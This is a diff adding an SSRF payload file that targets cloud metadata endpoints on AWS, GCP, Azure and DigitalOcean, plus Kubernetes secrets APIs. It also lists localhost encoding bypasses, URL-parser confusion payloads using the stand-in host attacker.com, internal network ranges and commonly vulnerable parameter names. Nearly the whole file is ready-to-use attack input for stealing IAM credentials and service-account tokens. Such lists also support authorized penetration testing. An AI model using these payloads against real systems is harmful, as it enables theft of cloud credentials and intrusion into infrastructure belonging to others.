@@ -1,0 +1,68 @@
+# SSRF payloads targeting cloud metadata services and internal resources.
+# Always probe collaborator (Burp Collaborator, interactsh) first to confirm egress.
+
+## AWS_IMDSV1
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/dynamic/instance-identity/document
+
+## AWS_IMDSV2_BYPASS
+# IMDSv2 requires a PUT first to obtain a token:
+# curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"
+# If the SSRF primitive only supports GET, IMDSv2-only hosts are often unreachable.
+
+## GCP
+# Header required: Metadata-Flavor: Google
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata/computeMetadata/v1/instance/service-accounts/default/token
+
+## AZURE
+# Header required: Metadata: true
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+## DIGITALOCEAN
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/user-data
+
+## KUBERNETES
+https://kubernetes.default.svc/api/v1/namespaces/default/secrets
+http://kubernetes.default/
+
+## IP_BYPASS_TECHNIQUES
+# Decimal, hex, octal, DNS rebinding encodings of 127.0.0.1
+127.1
+2130706433
+0x7f000001
+017700000001
+127.0.0.1.nip.io
+127.0.0.1.xip.io
+localtest.me
+
+## LOCALHOST_CASE_ALIASES
+LOCALHOST
+LocalHost
+[::1]
+[0:0:0:0:0:0:0:1]
+0.0.0.0
+
+## URL_PARSER_CONFUSION
+http://attacker.com@169.254.169.254/
+http://169.254.169.254#@attacker.com/
+http://169.254.169.254\@attacker.com/
+http://attacker.com/?target=http://169.254.169.254/
+
+## INTERNAL_NETWORK_RANGES
+10.0.0.0/8
+172.16.0.0/12
+192.168.0.0/16
+169.254.0.0/16
+
+## COMMON_VULNERABLE_PARAMS
+url, uri, path, dest, redirect, next, webhook, callback, fetch, image, src,
+avatar, import, upload_url, proxy, site, host, feed, to, out, view, dir,
+show, navigation, open, file, document
+# Screenshot/preview services, PDF generators, OAuth callbacks, webhooks, avatar-upload-by-URL
